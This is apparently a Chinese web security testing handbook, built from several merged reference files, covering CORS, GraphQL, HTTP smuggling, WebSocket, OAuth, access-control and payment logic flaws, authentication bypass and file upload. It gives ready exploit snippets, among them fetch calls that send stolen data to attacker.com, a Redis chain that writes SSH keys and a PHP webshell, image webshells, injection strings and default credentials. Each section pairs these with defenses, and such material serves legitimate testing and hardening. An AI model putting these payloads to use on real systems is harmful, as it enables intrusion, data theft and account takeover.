> **来源**: 基于WooYun漏洞库、OWASP及业界安全实践提炼，涵盖CORS、GraphQL、HTTP走私、WebSocket、OAuth五大现代Web协议攻击面。
> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析

---

## 一、CORS错误配置

### 1.1 漏洞本质

```
CORS风险 = Access-Control-Allow-Origin配置过宽 × 敏感接口缺乏额外鉴权
```

浏览器同源策略本是安全屏障，CORS错误配置将其打破，允许恶意站点跨域读取用户敏感数据。

### 1.2 检测方法

```bash
# 基础检测: 发送自定义Origin观察响应
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# 检查响应头:
# Access-Control-Allow-Origin: https://evil.com  → 危险!
# Access-Control-Allow-Credentials: true          → 可携带Cookie跨域请求
```

**危险配置模式**

| 模式 | 风险 | 说明 |
|------|------|------|
| `Access-Control-Allow-Origin: *` | 高 | 通配符，任意域可读取(但不可带Cookie) |
| 动态反射Origin | 极高 | 将请求Origin直接作为响应头返回 |
| `null` Origin允许 | 高 | `<iframe sandbox>`可构造null来源 |
| 正则匹配缺陷 | 高 | `evil.com.attacker.com`匹配`evil.com` |
| 子域通配 | 中 | `*.target.com`含已失控的子域 |

### 1.3 利用方式

```html
<!-- 恶意页面: 跨域窃取用户数据 -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null Origin利用 -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 防御措施

- **严格白名单校验Origin**：不要动态反射，使用精确匹配列表
- 避免`Access-Control-Allow-Origin: *`与`Access-Control-Allow-Credentials: true`同时使用
- 避免允许`null` Origin
- 正则匹配必须锚定(^和$)，防止子串匹配绕过
- 敏感接口增加CSRF Token等额外鉴权，不仅依赖CORS

---

## 二、GraphQL安全

### 2.1 漏洞本质

```
GraphQL风险 = 强大的查询能力 × 默认开放的内省机制 × 缺乏细粒度鉴权
```

GraphQL单一端点暴露全部数据模型，内省机制提供完整API文档，攻击者无需猜测接口。

### 2.2 内省查询 - 信息泄露

```graphql
# 获取完整Schema（类型、字段、参数）
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 精简版：仅获取查询类型
{__schema{queryType{name,fields{name}}}}

# 获取mutation列表
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 常见攻击向量

**注入攻击**

```graphql
# 参数拼接导致SQL注入
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL注入
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**批量查询DoS（嵌套查询耗尽资源）**

```graphql
# 深度嵌套 - 指数级数据库查询
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# 别名批量查询 - 单次请求枚举大量数据
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# 批量mutation暴力破解
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**认证绕过**

```graphql
# mutation缺少鉴权检查
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 防御措施

- **禁用生产环境内省查询**：检查`__schema`/`__type`请求并拒绝
- 查询深度限制(推荐最大10层)与复杂度分析
- 速率限制与查询超时(防批量/嵌套DoS)
- 字段级权限控制(每个resolver独立鉴权)
- 输入参数化处理(防注入)、禁止字符串拼接构建查询
- 使用持久化查询(Persisted Queries)，仅允许预注册的查询执行

---

## 三、HTTP请求走私

### 3.1 漏洞本质

```
前端代理(CDN/LB) 与 后端服务器 对HTTP请求边界的解析不一致
→ 一个TCP连接中"走私"了额外的请求 → 影响其他用户的请求处理
```

核心矛盾：`Content-Length`(CL) 与 `Transfer-Encoding: chunked`(TE) 同时存在时，前后端选择不同的头部进行解析。

### 3.2 三种攻击类型

| 类型 | 前端解析 | 后端解析 | 说明 |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | 前端按CL转发，后端按TE解析 |
| TE.CL | Transfer-Encoding | Content-Length | 前端按TE转发，后端按CL解析 |
| TE.TE | Transfer-Encoding | Transfer-Encoding | 混淆TE头使一方忽略 |

### 3.3 经典Payload

**CL.TE走私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL走私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE混淆变体**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 检测与利用

```
检测方法:
1. 发送CL/TE冲突请求，观察超时/响应异常
2. 走私一个不完整请求，看后续请求是否受影响
3. 工具: Burp Suite HTTP Request Smuggler扩展

利用场景:
- 绕过前端WAF/ACL → 走私恶意请求到后端
- 劫持其他用户请求 → 窃取Cookie/Session
- 缓存投毒 → 走私请求污染CDN缓存内容
- 请求路由劫持 → 将请求导向任意后端
```

### 3.5 防御措施

- 前后端使用统一的HTTP解析库/版本
- 禁止同时出现CL和TE头，拒绝模糊请求
- 禁用HTTP/1.0 Keep-Alive后端连接复用
- 升级到HTTP/2(二进制帧协议，天然免疫CL/TE歧义)
- CDN/LB配置规范化请求头后再转发

---

## 四、WebSocket安全

### 4.1 漏洞本质

```
WebSocket风险 = HTTP握手后脱离传统安全模型 × 持久双向通道缺乏逐消息鉴权
```

WebSocket连接一旦建立，后续消息不再经过标准HTTP安全机制(Cookie SameSite/CSRF Token等)。

### 4.2 跨站WebSocket劫持(CSWSH)

```html
<!-- 恶意页面: 劫持用户WebSocket连接 -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // 以受害者身份发送请求
};
ws.onmessage = function(e) {
    // 窃取响应数据
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**原理**：WebSocket握手是标准HTTP请求，浏览器会自动携带Cookie。若服务端不验证Origin头，恶意页面可建立经过认证的ws连接。

### 4.3 消息注入

```javascript
// 通过WebSocket发送注入payload
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL注入
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // 命令注入
```

### 4.4 认证不足

| 问题 | 风险 | 说明 |
|------|------|------|
| 仅握手时认证 | Session过期后连接仍有效 | ws连接可持续数小时 |
| 无消息级鉴权 | 任何已连接客户端可执行全部操作 | 缺乏per-message授权检查 |
| Token明文传输 | WebSocket不加密(ws://) | 使用wss://强制加密 |

### 4.5 防御措施

- **验证Origin头**：握手时检查Origin是否在白名单内(防CSWSH)
- **Token鉴权**：握手时通过URL参数或首条消息传递Token(不依赖Cookie)
- **消息校验**：对每条消息做输入验证和输出编码(防注入)
- 使用wss://强制加密传输
- 实现心跳机制和Session超时自动断开
- 消息速率限制(防DoS)

---

## 五、OAuth 2.0/OIDC安全

### 5.1 漏洞本质

```
OAuth风险 = 复杂的多方交互流程 × 参数校验不严格 × 实现偏离规范
```

OAuth授权流程涉及客户端、授权服务器、资源服务器三方交互，任何一环配置不当都可导致Token泄露或账户接管。

### 5.2 redirect_uri操纵

```
# 正常流程
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# 攻击: 篡改redirect_uri窃取授权码
redirect_uri=https://attacker.com/steal           # 完全替换
redirect_uri=https://app.com.attacker.com/callback # 子域混淆
redirect_uri=https://app.com/callback/../../../attacker # 路径遍历
redirect_uri=https://app.com/callback?next=https://attacker.com # 开放重定向链
```

### 5.3 常见攻击向量

| 攻击类型 | 原理 | 利用条件 |
|----------|------|----------|
| CSRF攻击 | state参数缺失或可预测 | 将攻击者账号绑定到受害者 |
| Token泄露(Referer) | 隐式模式token在URL Fragment中 | 页面含外部资源引用 |
| Token泄露(日志) | 授权码/token记录在服务端日志 | 日志可访问 |
| PKCE绕过 | 公共客户端未使用code_challenge | 拦截授权码即可换取token |
| IdP混淆(Mix-Up) | 多IdP场景下混淆授权响应来源 | 客户端支持多个OAuth提供商 |
| 授权码重放 | 授权码未一次性使用 | 拦截授权码后重复兑换 |

### 5.4 CSRF与state参数

```
# 攻击流程 (state缺失时)
1. 攻击者发起OAuth授权，获取自己账号的授权码
2. 构造链接: https://app.com/callback?code=ATTACKER_CODE
3. 诱骗受害者点击 → 受害者账号绑定攻击者的第三方账号
4. 攻击者用第三方账号登录 → 接管受害者账户

# 防御: state参数
state=随机不可预测值(绑定用户Session)
→ 回调时校验state与Session匹配
```

### 5.5 隐式模式风险

```
# 隐式模式(Implicit Flow) - 已不推荐
https://app.com/callback#access_token=eyJ...&token_type=bearer

风险:
- Token在URL Fragment中，可被浏览器历史/Referer头泄露
- 无法使用refresh_token，用户体验差
- 无法绑定客户端身份(无client_secret)

→ 替代方案: Authorization Code Flow + PKCE
```

### 5.6 防御措施

- **严格redirect_uri白名单**：精确匹配(不允许通配符/子路径)
- **强制state参数**：绑定Session、不可预测、一次性使用
- **强制PKCE**：所有客户端(尤其公共客户端/SPA)必须使用code_challenge
- 使用Authorization Code Flow，弃用Implicit Flow
- 授权码一次性使用，短有效期(推荐10分钟内)
- Token绑定(DPoP/mTLS)防止Token被盗用
- 定期审计已授权的第三方应用和权限范围

---

*基于WooYun漏洞库(88,636条)提炼 + OWASP/RFC安全标准 | 仅供安全研究与防御参考*


---

## Source: web-logic-auth.md

Path: references\web-logic-auth.md

# Web逻辑与认证安全

> **来源**: 基于WooYun漏洞库88,636个真实漏洞提炼，覆盖逻辑缺陷(8,292个)与未授权访问(14,377个)两大类
> **用途**: Web应用安全测试中逻辑漏洞与认证绕过的实战参考手册

---

## 一、越权漏洞

### 1.1 漏洞本质

越权漏洞的根因是**授权校验缺失或不完整**——服务端未在每次资源操作时验证请求者是否具有对应权限。

| 类型 | 定义 | 根因 | 风险等级 |
|------|------|------|----------|
| 水平越权 | 同级用户间越界访问 | 未校验资源归属 | 高 |
| 垂直越权 | 低权限执行高权限操作 | 未校验角色权限 | 严重 |

### 1.2 水平越权(IDOR)

**高频场景与利用方式**:

```
场景1: ID遍历——自增ID导致可预测
GET /address/edit/?addid=100001  → 自己的地址
GET /address/edit/?addid=100002  → 他人的地址(越权)

场景2: 资源替换攻击——修改操作缺少所有权验证
账号A创建发票ID=1001 → 账号B修改时替换ID=1001 → A的发票被覆盖

场景3: API参数遍历——接口仅验证登录不验证权限
/personal/center/family/{id}/edit → 替换id泄露他人信息
```

**测试方法**:
1. 抓包记录正常请求中的ID参数(uid/orderId/addid等)
2. 替换为其他用户的ID，观察响应
3. 自动化遍历(Burp Intruder或脚本)
4. 关注增删改查四类操作，修改和删除危害最大

```python
# IDOR自动化检测思路
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "敏感数据特征" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**越权测试矩阵**:

| 操作类型 | 测试方法 | 风险等级 |
|----------|----------|----------|
| 查看 | 替换资源ID | 中 |
| 修改 | 替换资源ID+数据 | 高 |
| 删除 | 替换资源ID | 严重 |
| 创建 | 替换归属用户ID | 高 |

### 1.3 垂直越权

**核心利用方式**:

```http
# 普通用户修改资料时篡改角色标识
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 普通用户

# 篡改为管理员
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 超级管理员
```

**检测要点**:
- 枚举角色ID: 通常 1=超管, 2=管理员, 3+=普通用户
- 测试角色切换: 修改请求中角色标识(role/aid/type/level)
- 低权限账号直接访问管理员接口URL
- 篡改权限标识: `isAdmin=0->1`, `role=user->admin`

### 1.4 防御措施

- 资源访问前强制校验所有权: `WHERE id=? AND user_id=当前用户`
- 使用UUID替代自增ID，防止枚举
- 敏感操作记录审计日志
- 实施最小权限原则，后端逐接口鉴权
- 权限校验逻辑集中管理(中间件/拦截器)

---

## 二、支付逻辑漏洞

### 2.1 漏洞本质

支付漏洞的核心是**信任边界错误**——将价格计算等敏感逻辑下沉到客户端，服务端未独立校验。

```
安全模型: 不可信区域(客户端) -> 信任边界 -> 可信区域(服务端)
错误实现: 直接接受客户端提交的价格作为事实依据
正确实现: 客户端仅提供商品ID，服务端独立查价计算
```

### 2.2 常见场景与利用技巧

**场景1: 金额直接篡改**

```http
# 原始请求
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# 篡改请求
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**场景2: 优惠券/折扣逻辑滥用**

```
1. 购买商品A(59元)，触发"满59换购B(5.9元)"
2. 下单A+B，支付64.9元
3. 取消商品A，仅保留B
4. 实际以5.9元购得原价21元的商品B

测试思路: 组合订单后部分取消、优惠券使用后退货、积分兑换后退款
```

**场景3: 虚拟货币刷取**
- 注册推广可获积分 -> 暴力破解验证码批量注册 -> 积分兑换实物

**场景4: 数量/负数攻击**
- `count=1 -> count=-1` (负数导致退款)
- `price=100 -> price=-100` (负金额)

### 2.3 系统化测试方法

```
Phase 1: 参数指纹识别
  - 抓包订单创建接口
  - 识别价格参数(price/amount/total/cost/discount)
  - 确定参数类型(整型/浮点/字符串)

Phase 2: 边界值测试
  - 最小值: 0, 0.01
  - 负数: -1, -100, -0.01
  - 格式: 科学计数法(1e-10), JSON嵌套
  - 精度: 浮点溢出, 舍入误差

Phase 3: 逻辑绕过
  - 参数冗余: 提交多个price参数
  - 参数覆盖: 先提价后降价
  - 优惠券叠加: 价格+折扣双重操纵
  - 组合订单后部分取消/退货

Phase 4: 支付流程各环节校验
  - 订单生成 -> 检查订单金额
  - 支付跳转 -> 验证支付金额
  - 支付回调 -> 伪造回调签名
  - 退款流程 -> 检查退款金额
```

**高级利用技巧**:

```python
# 价格篡改+并发竞争
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# 参数污染: 某些框架会处理重复参数
POST /order/create?price=299.00&price=0.01

# 类型转换绕过
{"price":"0.01"}     字符串
{"price":1e-10}      科学计数法
{"price":null}       NULL注入
```

### 2.4 防御措施

```
Layer 1 输入验证: 仅接受商品ID不接受price; 金额正数最多2位小数
Layer 2 业务逻辑: 服务端独立计算价格; 价格偏离阈值时拒绝/人工审核
Layer 3 数据完整性: 订单签名(HMAC)防篡改; 时间戳防重放; 幂等性防重复
Layer 4 支付验证: 回调金额=订单金额; 严格状态机; 全链路审计日志
```

---

## 三、密码重置漏洞

### 3.1 漏洞本质

密码重置漏洞的本质是**身份验证链条断裂**——重置流程中某个环节未正确绑定用户身份。

### 3.2 四大漏洞模式

**模式A: 验证码回显泄露**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# 响应中直接包含验证码
{"code":0,"data":{"verifyCode":"123456"}}
```

检测方法: 拦截发送验证码的响应包，搜索4-6位数字。

**模式B: 验证码与用户解绑**

```
1. 用自己手机号收到验证码A
2. 对目标账号发起找回密码
3. 使用验证码A完成验证(未绑定用户身份)
根因: 验证码仅校验有效性，未校验归属用户
```

**模式C: 重置步骤可跳过**

```
正常: 输入账号 -> 身份验证 -> 重置密码 -> 完成
攻击: 输入账号 -> [跳过] -> 直接访问重置密码页面

实现方式:
1. 分析前端JS，找到各步骤URL
2. 直接访问第3步URL
3. F12修改DOM: 隐藏验证步骤，显示重置步骤
```

**模式D: 凭证参数可控**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# 漏洞: username来自客户端，可被篡改为任意用户
```

### 3.3 测试流程

```
发起密码重置
  +-- 抓包分析响应 -> 是否包含验证码 -> 模式A
  +-- 分析验证流程
  |     +-- 多步骤 -> 尝试跳过中间步骤 -> 模式C
  |     +-- 单步骤 -> 检查参数绑定
  |           +-- 用户ID可控 -> 参数篡改 -> 模式D
  |           +-- 绑定Session -> Session固定测试
  +-- 验证码机制
        +-- 验证码是否与用户绑定 -> 模式B
        +-- 验证码是否可爆破(无频率限制)
        +-- 验证码是否有时效性
```

### 3.4 防御措施

- 验证码绑定用户Session，校验归属
- 验证码单次有效+60秒过期
- 重置Token一次性使用，不可预测
- 全流程服务端状态校验，禁止跳步
- 失败5次锁定，防爆破

---

## 四、业务逻辑缺陷

### 4.1 漏洞本质

业务逻辑缺陷的根因矩阵:

| 层级 | 缺陷类型 | 典型表现 |
|------|----------|----------|
| 业务层 | 流程设计缺陷 | 步骤可跳过、状态可伪造 |
| 接口层 | 参数信任过度 | 客户端校验、服务端未验证 |
| 认证层 | 凭证管理缺陷 | Token泄露、Session固定 |
| 授权层 | 权限边界模糊 | 水平/垂直越权 |

### 4.2 验证码绕过

**绕过方式1: 验证码不刷新**
- 登录失败后验证码不自动刷新，同一验证码可重复使用
- 利用: 手工识别一次，固定验证码暴力破解密码

**绕过方式2: 验证码可爆破**
- 4-6位纯数字，无次数/频率限制
- 爆破空间10000-1000000，30线程约30秒完成

**绕过方式3: 前端校验**
- 验证码仅在前端JS校验，删除前端校验代码或直接调用接口即可绕过

**验证码安全检测清单**:
- 验证码是否在响应中泄露
- 是否与Session/用户绑定
- 是否有时效性(建议60秒)
- 验证失败是否强制刷新
- 是否有频率限制(建议5次/分钟)
- 复杂度是否足够(建议6位字母数字混合)

### 4.3 条件竞争(Race Condition)

适用场景: 优惠券使用、积分兑换、库存扣减、余额支付

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 并发100次，尝试多次兑换同一份积分
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

根因: 检查余额与扣减余额不是原子操作，并发下可多次通过检查。

### 4.4 参数篡改系统化方法

| 参数类型 | 篡改方向 | 示例 |
|----------|----------|------|
| 用户ID | 替换为其他用户 | uid=1001->1002 |
| 金额 | 减小/归零/负数 | price=100->0.01 |
| 数量 | 负数 | count=1->-1 |
| 状态 | 翻转布尔值 | isPaid=false->true |
| 角色 | 提升权限 | role=user->admin |
| 时间 | 延长有效期 | expireTime->2099-12-31 |

### 4.5 业务流程逆向分析法

```
步骤1: 绘制完整业务流程图
步骤2: 识别每个环节的校验点
步骤3: 评估校验是否可绕过(前端/后端? 可重放? 参数可控?)
步骤4: 设计绕过测试用例

示例(密码重置流程):
[输入账号] -> [发送验证码] -> [验证身份] -> [设置新密码]
     |              |              |              |
  账号枚举      验证码泄露      步骤跳过      参数篡改
```

### 4.6 防御原则

- **服务端权威**: 所有校验在服务端完成，前端校验仅为UX
- **原子操作**: 关键业务(扣款/库存)使用事务+锁
- **状态机**: 业务流程严格按状态机推进，不可跳步
- **防重放**: 关键接口幂等设计，请求带时间戳+签名

---

## 五、认证绕过

### 5.1 漏洞本质

认证绕过的核心是**信任链条被打破**: 系统错误地信任了来自不可信源的身份声明。

### 5.2 Cookie/Session伪造

```
# 直接写入Cookie获得身份
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> 向Cookie写入admin身份，直接获得管理员Session

# Cookie中的身份标识可预测
Cookie: admin=true; userId=1
-> 修改Cookie值即可切换身份
```

JWT绕过:

| 技术 | Payload |
|------|---------|
| 空算法 | alg: none |
| 弱密钥 | 暴力破解HS256密钥 |
| 算法混淆 | RS256转HS256，用公钥签名 |

### 5.3 响应篡改绕过

```
正常: 请求验证 -> {"status":"0","msg":"验证码错误"} -> 停留验证页
攻击: 请求验证 -> 拦截响应 -> 修改为{"status":"1","msg":"成功"} -> 进入下一步
```

适用条件: 客户端根据响应状态控制流程+服务端后续步骤不重新验证。

### 5.4 IP伪造/Header绕过

```http
# 绕过IP白名单的常用Header
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 路径绕过

```
# 大小写混淆
/ADMIN/  /Admin/  /aDmIn/

# URL编码绕过
%2e%2e%2f = ../
%252e%252e%252f = ../ (双重编码)

# 空字节截断
../../../etc/passwd%00.jpg

# 添加后缀绕过
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 后台未授权访问

高频未授权路径:

```
# Web中间件
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, 可泄露密码)

# API接口
/swagger-ui.html       (API文档)
/api-docs              (API文档)
/api/configs           (配置泄露)

# 调试/管理
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (Druid监控)
```

中间件弱口令速查:

| 中间件 | 常见弱口令 |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin(或无认证) |

### 5.7 数据库/服务未授权

| 服务 | 端口 | 验证命令 | 利用方式 |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | 写SSH公钥/Webshell/计划任务 |
| MongoDB | 27017 | mongo IP:27017 | 无认证直连，导出全部数据 |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | 读取索引数据 |
| Memcached | 11211 | echo stats, nc IP 11211 | 数据泄露 |
| Docker API | 2375 | curl IP:2375/info | 容器逃逸/RCE |

Redis未授权利用链(高危):

```bash
redis-cli -h target
# 写SSH公钥
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# 写Webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Session绕过

```
# Session ID泄露(日志/URL)
/logs/ctp.log -> 包含Session ID -> 直接使用

# Session固定攻击
强制用户使用攻击者指定的Session ID

# Session预测
时间戳/顺序号生成的弱Session -> 可预测下一个Session
```

### 5.9 万能密码(SQL注入登录)

```
用户名: ' or 1=1--
密码:   任意

用户名: admin'--
密码:   任意
```

### 5.10 认证绕过测试清单

| 测试项 | 方法 | 工具 |
|--------|------|------|
| Cookie伪造 | 修改用户标识字段 | BurpSuite |
| Session固定 | 复用他人Session | 抓包工具 |
| 响应篡改 | 修改返回状态码 | BurpSuite |
| IP伪造 | 添加X-Forwarded-For | curl/Burp |
| 前端绕过 | 修改JS逻辑 | DevTools |
| JWT篡改 | 空算法/弱密钥 | jwt.io/hashcat |
| 路径绕过 | 大小写/编码/截断 | 手动+字典 |
| 弱口令 | 默认凭证尝试 | Hydra |
| SQL注入登录 | 万能密码 | 手动 |

### 5.11 防御措施

| 层面 | 措施 |
|------|------|
| 网络 | 内网服务不暴露公网，VPN/堡垒机访问 |
| 认证 | 强制复杂密码，禁用默认账户，启用MFA |
| 授权 | 后端每接口校验权限，最小权限原则 |
| Session | 登录后重新生成SessionID，HttpOnly+Secure |
| 监控 | 异常登录告警，失败次数锁定，日志审计 |
| 加固 | 关闭调试接口，删除默认管理页面 |

---

## 六、系统化测试框架

### 6.1 四阶段测试法

```
Phase 1: 情报收集
  - 枚举所有功能点与接口
  - 绘制业务流程图
  - 识别敏感操作(支付/重置/权限变更)
  - 确定参数的可控性

Phase 2: 威胁建模
  - 分析每个接口的输入参数与信任边界
  - 标记服务端 vs 前端校验
  - 构建攻击树(按越权/支付/认证分类)
  - 优先级排序(高影响 x 高可能性)

Phase 3: 漏洞验证
  - 按优先级逐项测试
  - 记录PoC(请求/响应截图)
  - 评估影响范围(数据量/用户数/金额)

Phase 4: 报告输出
  - 漏洞描述+复现步骤
  - 根因分析+影响评估
  - 修复建议(短期+长期)
  - 风险评级(CVSS)
```

### 6.2 高频漏洞模式速查

| 漏洞模式 | 检测信号 | 快速验证方法 |
|----------|----------|-------------|
| IDOR | URL/参数含自增ID | 替换ID看是否返回他人数据 |
| 金额篡改 | 请求含price/amount | 改为0.01观察订单 |
| 验证码回显 | 发验证码后抓包 | 搜索响应中4-6位数字 |
| 步骤跳过 | 多步骤流程 | 直接访问后续步骤URL |
| 响应篡改 | 客户端根据status跳转 | 改status=1看是否放行 |
| 未授权后台 | 目录扫描发现管理路径 | 直接访问看是否需要登录 |
| 弱口令 | 发现登录页 | 尝试admin/admin等默认凭证 |
| 条件竞争 | 余额/库存/优惠券操作 | 并发50+请求观察是否多扣 |

### 6.3 实战工具推荐

| 工具 | 核心用途 | 适用场景 |
|------|----------|----------|
| BurpSuite | 流量拦截、参数篡改、重放 | 全场景核心工具 |
| Postman | API测试、批量请求 | 接口逻辑测试 |
| Hydra | 密码爆破 | 弱口令/撞库 |
| OWASP ZAP | 自动化扫描 | 初步发现 |
| 自定义脚本 | 并发测试、ID遍历 | 竞争条件/IDOR |

---

*文档版本: v1.0*
*数据来源: WooYun漏洞库(88,636条): 逻辑缺陷(8,292条)+未授权访问(14,377条)*
*生成时间: 2026-02-06*


---

## Source: web-file-infra.md

Path: references\web-file-infra.md

# Web文件与基础设施安全

> **来源**: 基于WooYun漏洞库88,636个真实漏洞案例提炼，涵盖文件上传(2,711例)、文件遍历/下载(50例深度分析)、信息泄露(7,337例)三大领域。
> **方法论**: WooYun漏洞本质公式 + INTJ式系统分析框架

---

## 一、文件上传漏洞

### 1.1 漏洞本质

```
攻击链: 上传点发现 → 检测绕过 → 路径获取 → 解析利用 → Webshell运行
成功率 = P(绕过检测) × P(获取路径) × P(解析运行)
```

核心矛盾: 功能需求(允许上传) vs 安全需求(限制执行)。大多数防御仅关注"绕过检测"，忽略路径泄露和解析配置。

### 1.2 上传点识别

| 上传点类型 | 频率 | 风险 | 典型路径 |
|-----------|------|------|---------|
| 富文本编辑器 | 42% | 极高 | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| 头像上传 | 18% | 高 | `/upload/avatar/`, `/member/uploadfile/` |
| 附件/文档 | 15% | 高 | `/uploads/`, `/attachment/` |
| 后台功能 | 12% | 极高 | `/admin/upload/`, `/system/upload/` |
| 导入功能 | 5% | 高 | `/import/`, `/excelUpload/` |

编辑器测试路径:

| 编辑器 | 测试路径 | 上传接口 |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 绕过技巧 - 扩展名

黑名单绕过速查表:

| 技巧 | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| 大小写 | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
| 特殊后缀 | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| 空格/点 | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| 分号(IIS) | N/A | `.asp;.jpg` | N/A |
| 换行(Apache) | `.php\x0a` | N/A | N/A |

白名单绕过方法:

| 技术 | 原理 | 条件 |
|-----|------|------|
| 解析漏洞 | 上传白名单文件但被特殊解析 | IIS/Apache/Nginx漏洞 |
| Apache多后缀 | `shell.php.jpg` 被解析为php | Apache多后缀配置 |
| %00截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 配置文件上传 | 上传`.htaccess`/`.user.ini` | 允许txt/配置文件 |
| 图片马+LFI | 上传图片马配合文件包含 | 存在LFI漏洞 |

### 1.4 绕过技巧 - MIME/Content-Type

```
修改Content-Type为以下值即可绕过:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (通用)

Burp拦截修改示例:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- 关键修改点
```

### 1.5 绕过技巧 - 文件头/内容检测

常见文件Magic Number:

| 类型 | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | 无可读ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

图片马制作:

```bash
# 方法1: 简单添加文件头
GIF89a<?php system($_POST['cmd']); ?>

# 方法2: 合并文件
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# 方法3: EXIF注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web服务器解析漏洞

```
IIS 5.x/6.0:
  目录解析: /shell.asp/1.jpg     -> 解析为ASP
  文件解析: shell.asp;.jpg       -> 解析为ASP
  畸形解析: shell.asp.jpg        -> 可能解析为ASP

Apache:
  多后缀: shell.php.xxx          -> 从右向左解析
  .htaccess: AddType application/x-httpd-php .jpg
  换行解析: shell.php%0a         -> CVE-2017-15715

Nginx:
  畸形解析: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  空字节: shell.jpg%00.php       -> 老版本漏洞

Tomcat:
  PUT方法: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 配置文件劫持解析

```apache
# .htaccess: 让jpg被解析为PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): 自动包含图片马
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): 让jpg被FastCGI处理 -->
<handlers>
